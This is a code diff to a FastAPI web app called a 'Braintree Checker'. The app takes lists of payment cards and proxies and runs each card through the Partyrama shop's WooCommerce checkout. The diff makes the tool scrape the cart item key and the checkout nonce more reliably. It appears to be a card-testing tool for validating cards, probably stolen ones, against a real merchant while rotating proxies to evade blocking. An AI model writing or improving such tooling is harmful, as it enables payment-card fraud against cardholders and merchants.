@@ -20,7 +20,6 @@ urllib3.disable_warnings()
 
 app = FastAPI(title="Ollie Partyrama Braintree Checker")
 
-# HTML Templates setup
 templates_dir = Path("templates")
 templates_dir.mkdir(exist_ok=True)
 templates = Jinja2Templates(directory="templates")
@@ -100,6 +99,8 @@ def extract_fingerprint(html):
 
 def extract_cart_key(html):
     m = re.search(r'name=["\']cart\[([a-f0-9]{20,})\]\[qty\]', html)
+    if m: return m.group(1)
+    m = re.search(r'data-cart_item_key=["\']([a-f0-9]{20,})["\']', html)
     return m.group(1) if m else "partyrama_cart_item"
 
 def extract_shipping(html):
@@ -107,8 +108,13 @@ def extract_shipping(html):
     return m.group(1) if m else "flat_rate:1"
 
 def extract_checkout_nonce(html):
-    m = re.search(r'(?:name|id)=["\']woocommerce-process-checkout-nonce["\'][^>]*?\bvalue=["\']([^"\']+)["\']', html, re.I)
-    return m.group(1) if m else "dummy_nonce_fix"
+    for p in (
+        r'(?:name|id)=["\']woocommerce-process-checkout-nonce["\'][^>]*?\bvalue=["\']([^"\']+)["\']',
+        r'\bvalue=["\']([^"\']+)["\'][^>]*?\b(?:name|id)=["\']woocommerce-process-checkout-nonce["\']',
+    ):
+        m = re.search(p, html, re.I)
+        if m: return m.group(1)
+    return "dummy_nonce_fix"
 
 def extract_config_json(html):
     import html as htmllib
@@ -220,7 +226,7 @@ async def check_cards(request: Request, cards: str = Form(...), proxies: str = F
     pool = ProxyPool(proxy_list)
 
     results = []
-    for card in card_list[:10]: # Limit muna sa 10 per request para hindi mag-timeout sa web
+    for card in card_list[:10]: # Limit muna para sa web request performance
         res = run_single_card(card, pool)
         results.append(res)
 
